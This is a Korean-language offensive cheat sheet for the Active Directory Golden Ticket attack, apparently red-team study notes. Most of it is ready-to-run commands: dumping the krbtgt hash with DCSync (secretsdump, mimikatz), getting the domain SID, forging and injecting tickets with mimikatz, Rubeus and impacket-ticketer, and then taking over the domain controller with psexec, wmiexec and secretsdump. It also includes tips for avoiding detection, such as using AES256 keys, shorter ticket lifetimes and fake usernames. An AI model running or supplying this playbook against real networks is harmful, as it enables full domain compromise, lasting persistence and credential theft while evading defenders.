# 01_Golden_Ticket

# AD DC장악 — Golden Ticket

---

## 개념

Golden Ticket은 krbtgt 계정의 NTLM 해시(또는 AES 키)와 도메인 SID를 이용해 임의의 TGT를 위조하는 공격이다. Kerberos에서 KDC는 TGT가 krbtgt 해시로 올바르게 서명되어 있으면 내용(유저명, 그룹 멤버십, 유효 기간 등)을 검증하지 않는다. 따라서 존재하지 않는 유저 이름으로도, 이미 삭제된 계정으로도, DA 그룹에 속하지 않는 계정 이름으로도 유효한 TGT를 만들 수 있다.

Golden Ticket이 위협적인 이유는 몇 가지다. 첫째, 티켓 생성이 DC와 통신 없이 오프라인으로 이루어진다. 둘째, 기본 유효 기간이 10년으로 설정되어 사실상 영구적인 도메인 접근 수단이 된다. 셋째, 패스워드가 변경된 계정 이름으로 티켓을 만들어도 krbtgt 해시가 유효한 한 동작한다.

이를 무효화하려면 krbtgt 패스워드를 두 번 연속으로 변경해야 한다. krbtgt 계정은 이전 패스워드(해시)를 보유하기 때문에 한 번 변경으로는 이전 해시로 서명된 티켓이 여전히 유효하다. 이 때문에 실제 침해 사고 시 방어 측의 대응이 극히 어렵다.

---

## 필요 정보

```
krbtgt NTLM 해시    ->  DCSync로 획득
krbtgt AES256 키    ->  DCSync 출력에 포함 (더 스텔스)
도메인 SID          ->  여러 방법으로 획득
도메인 이름         ->  기본 열거에서 확인 (FQDN)
```

---

## krbtgt 해시 획득

```bash
# Linux — impacket-secretsdump
impacket-secretsdump \
  -just-dc-user krbtgt \
  corp.local/Administrator:'Password1!'@<DC_IP>

# NTLM 해시로
impacket-secretsdump \
  -just-dc-user krbtgt \
  -hashes :<NTLM> \
  corp.local/Administrator@<DC_IP>

# 출력 예시
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
# krbtgt:aes256-cts-hmac-sha1-96:<AES256_KEY>
# krbtgt:aes128-cts-hmac-sha1-96:<AES128_KEY>
```

```bash
:: Windows — mimikatz
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
:: 출력: Hash NTLM: <NTLM>, aes256_hmac: <AES256>

:: lsa patch (DC에 직접 접근한 경우)
lsadump::lsa /patch
```

---

## 도메인 SID 획득

SID에서 마지막 `-숫자` 부분(RID)만 제거한 값이 도메인 SID다.

```bash
# Linux — rpcclient
rpcclient -U "john%Password1!" <DC_IP> -c "lsaquery"
# Domain Sid: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

# impacket-lookupsid — RID 0 조회 시 도메인 SID 반환
impacket-lookupsid corp.local/john:'Password1!'@<DC_IP> 0
# corp.local S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

# secretsdump 출력에서 계정 SID 확인 후 마지막 RID 제거
# Administrator:500:... -> SID에서 -500 제거

# nxc (rid-brute 결과에서 SID 직접 추출 불가 — 위 방법 사용 권장)
```

```powershell
:: Windows
whoami /user
:: CORP\john  S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-1103
:: -> 마지막 -1103 제거 -> 도메인 SID

Get-ADDomain | Select-Object DomainSID      # AD 모듈

Import-Module .\PowerView.ps1
Get-DomainSID

# wmic
wmic useraccount where name="Administrator" get sid
:: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500 -> -500 제거
```

---

## mimikatz (Windows)

mimikatz의 `kerberos::golden` 모듈로 Golden Ticket을 생성하고 현재 세션에 주입한다. `/ptt`로 즉시 주입하거나 `/ticket`으로 파일에 저장할 수 있다.

주요 그룹 RID: 512(Domain Admins), 513(Domain Users), 518(Schema Admins), 519(Enterprise Admins), 520(Group Policy Creator Owners)

```bash
:: 생성과 동시에 현재 세션에 주입
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /krbtgt:<KRBTGT_NTLM> ^
  /id:500 /groups:512,513,518,519,520 /ptt

:: AES256 사용 (더 스텔스 — RC4 다운그레이드 탐지 우회)
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /krbtgt:<KRBTGT_NTLM> ^
  /aes256:<KRBTGT_AES256> ^
  /id:500 /groups:512,513,518,519,520 /ptt

:: 파일로 저장 후 나중에 주입
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /krbtgt:<KRBTGT_NTLM> ^
  /id:500 /ticket:golden.kirbi

kerberos::ptt golden.kirbi

:: 유효 기간 조정 (탐지 우회 — 기본 10년은 이상함)
:: /startoffset: 시작 오프셋 (분, 음수=과거)
:: /endin: 유효 기간 (분, 600=10시간)
:: /renewmax: 최대 갱신 기간 (분, 10080=7일)
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /krbtgt:<KRBTGT_NTLM> ^
  /id:500 /startoffset:-10 /endin:600 /renewmax:10080 /ptt

:: 존재하지 않는 유저명으로도 가능 (탐지 어려움)
kerberos::golden /user:NotExist /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /krbtgt:<KRBTGT_NTLM> ^
  /id:500 /groups:512,513,518,519,520 /ptt

:: 확인 및 테스트
klist
dir \\dc.corp.local\c$
```

---

## Rubeus (Windows)

```powershell
:: RC4 (NTLM 해시)
.\Rubeus.exe golden /rc4:<KRBTGT_NTLM> /domain:corp.local `
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX `
  /user:Administrator /ptt /nowrap

:: AES256 (더 스텔스)
.\Rubeus.exe golden /aes256:<KRBTGT_AES256> /domain:corp.local `
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX `
  /user:Administrator /ptt /nowrap

:: LDAP에서 자동으로 도메인 정보 조회 (SID 입력 불필요)
.\Rubeus.exe golden /rc4:<KRBTGT_NTLM> /domain:corp.local `
  /user:Administrator /ldap /ptt /nowrap

:: 유효 기간 조정
.\Rubeus.exe golden /rc4:<KRBTGT_NTLM> /domain:corp.local `
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX `
  /user:Administrator `
  /startoffset:-10 /endin:600 /renewmax:10080 /ptt /nowrap

:: 파일로 저장
.\Rubeus.exe golden /rc4:<KRBTGT_NTLM> /domain:corp.local `
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX `
  /user:Administrator /outfile:golden.kirbi /nowrap

:: 그룹 지정
.\Rubeus.exe golden /rc4:<KRBTGT_NTLM> /domain:corp.local `
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX `
  /user:Administrator /groups:512,513,518,519,520 /ptt /nowrap
```

---

## Impacket (Linux)

`impacket-ticketer`로 ccache 형식의 Golden Ticket을 생성한다. 사용 시 반드시 `/etc/hosts`에 DC FQDN을 등록해야 하고, KRB5CCNAME 환경변수를 설정해야 한다.

```bash
# RC4 (NTLM 해시)
impacket-ticketer \
  -nthash <KRBTGT_NTLM> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain corp.local \
  Administrator
# -> Administrator.ccache 생성

# AES256 (더 스텔스)
impacket-ticketer \
  -aesKey <KRBTGT_AES256> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain corp.local \
  Administrator

# 유효 기간 조정 (초 단위)
impacket-ticketer \
  -nthash <KRBTGT_NTLM> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain corp.local \
  -duration 36000 \
  Administrator

# 그룹 지정
impacket-ticketer \
  -nthash <KRBTGT_NTLM> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain corp.local \
  -groups 512,513,518,519,520 \
  Administrator

# /etc/hosts에 DC FQDN 등록 (필수)
echo "<DC_IP>  dc.corp.local corp.local" >> /etc/hosts

# 환경변수 설정 후 사용
export KRB5CCNAME=Administrator.ccache

impacket-psexec -k -no-pass administrator@dc.corp.local
impacket-wmiexec -k -no-pass administrator@dc.corp.local
impacket-smbexec -k -no-pass administrator@dc.corp.local
impacket-secretsdump -k -no-pass corp.local/administrator@dc.corp.local
impacket-smbclient -k -no-pass administrator@dc.corp.local

# 접근 테스트
impacket-smbclient -k -no-pass administrator@dc.corp.local
# smb: \> ls
```

---

## 주의사항

```
- 기본 유효 기간 10년은 탐지 시그니처가 될 수 있음 -> /endin:600 권장
- RC4보다 AES256 사용이 더 스텔스 (이벤트 로그 암호화 타입 확인)
- DC 접근 시 IP 대신 FQDN 사용 (Kerberos는 FQDN 필수)
- krbtgt 1회 변경: 이전 해시로 아직 유효
- krbtgt 2회 연속 변경: 완전 무효화
- 존재하지 않는 유저 이름으로 만들면 4769 이벤트에 이상한 이름이 기록됨
```

---

## 흐름

DCSync로 krbtgt NTLM + AES256 키 추출 → 도메인 SID 확인 → ticketer / mimikatz로 Golden Ticket 생성 → KRB5CCNAME 설정 또는 ptt 주입 → /etc/hosts FQDN 등록 → FQDN으로 DC 접근 → 도메인 완전 장악